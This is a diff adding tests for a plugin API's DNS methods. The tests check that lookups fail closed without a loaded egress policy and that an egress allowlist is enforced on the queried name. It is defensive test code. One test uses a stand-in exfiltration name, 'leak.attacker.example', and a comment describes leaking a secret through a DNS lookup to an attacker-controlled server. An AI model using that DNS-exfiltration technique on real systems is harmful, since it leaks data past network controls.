@@ -22,6 +22,69 @@ test('api.dns REFUSES resolution without the network grant', async () => {
     await assert.rejects(() => api.dns.resolve4('gmail.com'), /network/i, 'resolve4 gated');
 });
 
+// Synthetic resolver: every record type answers without touching the network, and records which name
+// was actually queried — so the allowlist assertions below are deterministic and offline.
+function stubResolver() {
+    const dnsP = require('dns').promises;
+    const orig = { resolveMx: dnsP.resolveMx, resolveTxt: dnsP.resolveTxt, resolve4: dnsP.resolve4, resolve6: dnsP.resolve6 };
+    const queried: string[] = [];
+    dnsP.resolveMx = async (n: string) => { queried.push(n); return [{ exchange: `mx.${n}`, priority: 10 }]; };
+    dnsP.resolveTxt = async (n: string) => { queried.push(n); return [['v=spf1 -all']]; };
+    dnsP.resolve4 = async (n: string) => { queried.push(n); return ['8.8.8.8']; };
+    dnsP.resolve6 = async (n: string) => { queried.push(n); return ['2606:4700:4700::1111']; };
+    return { queried, restore: () => Object.assign(dnsP, orig) };
+}
+
+// Runs BEFORE any test installs a policy: in this process nothing has loaded plugin_egress_hosts yet,
+// which is exactly the "policy unavailable" state the spawn path fails CLOSED on (egressDenyAll).
+test('api.dns fails CLOSED while the egress policy is not loaded (no lookup leaves the host)', async () => {
+    assert.strictEqual(perms.isEgressPolicyLoaded(), false, 'precondition: no policy loaded in this process');
+    perms._setGrantsInMemory(SLUG, ['network']);
+    const api = createPluginApi(SLUG);
+    const r = stubResolver();
+    try {
+        for (const m of ['resolveMx', 'resolveTxt', 'resolve4', 'resolve6', 'resolve']) {
+            await assert.rejects(() => api.dns[m]('example.com'), /egress allowlist/i, `${m} must refuse`);
+        }
+        assert.deepEqual(r.queried, [], 'no query was sent');
+    } finally { r.restore(); }
+});
+
+test('api.dns applies the plugin egress ALLOWLIST to the NAME for every method (MX/TXT included)', async () => {
+    perms._setGrantsInMemory(SLUG, ['network']);
+    perms._setEgressAllowlistInMemory(SLUG, ['vendor.example']);
+    const api = createPluginApi(SLUG);
+    const r = stubResolver();
+    try {
+        // Off-allowlist: refused BEFORE the query — a lookup of `<secret>.attacker.example` is itself
+        // egress to the attacker's authoritative server, and MX/TXT answers carry no IP to filter.
+        for (const m of ['resolveMx', 'resolveTxt', 'resolve4', 'resolve6', 'resolve']) {
+            await assert.rejects(() => api.dns[m]('leak.attacker.example'), /egress allowlist/i, `${m} off-allowlist`);
+        }
+        // Not a substring match: `evilvendor.example` is not under `vendor.example`.
+        await assert.rejects(() => api.dns.resolveTxt('evilvendor.example'), /egress allowlist/i);
+        assert.deepEqual(r.queried, [], 'no off-allowlist name ever reached the resolver');
+
+        // On-allowlist (the host itself or a subdomain at a label boundary): answered.
+        assert.deepEqual(await api.dns.resolveMx('vendor.example'), [{ exchange: 'mx.vendor.example', priority: 10 }]);
+        assert.deepEqual(await api.dns.resolveTxt('_dmarc.vendor.example'), [['v=spf1 -all']]);
+        assert.deepEqual(await api.dns.resolve4('api.vendor.example'), ['8.8.8.8']);
+        assert.deepEqual(await api.dns.resolve6('api.vendor.example'), ['2606:4700:4700::1111']);
+        assert.deepEqual(await api.dns.resolve('vendor.example.'), ['8.8.8.8']);
+
+        // An EMPTY allowlist keeps today's behaviour: every public name may be resolved.
+        perms._setEgressAllowlistInMemory(SLUG, []);
+        assert.deepEqual(await api.dns.resolveTxt('anything.example'), [['v=spf1 -all']]);
+
+        // The network grant is still required on top of the allowlist.
+        perms._setGrantsInMemory(SLUG, []);
+        await assert.rejects(() => api.dns.resolveMx('vendor.example'), /network/i);
+    } finally {
+        r.restore();
+        perms._setEgressAllowlistInMemory(SLUG, []);
+    }
+});
+
 test('api.dns resolves MX/TXT/A with the network grant and strips private IPs', async (t) => {
     perms._setGrantsInMemory(SLUG, ['network']);
     const api = createPluginApi(SLUG);
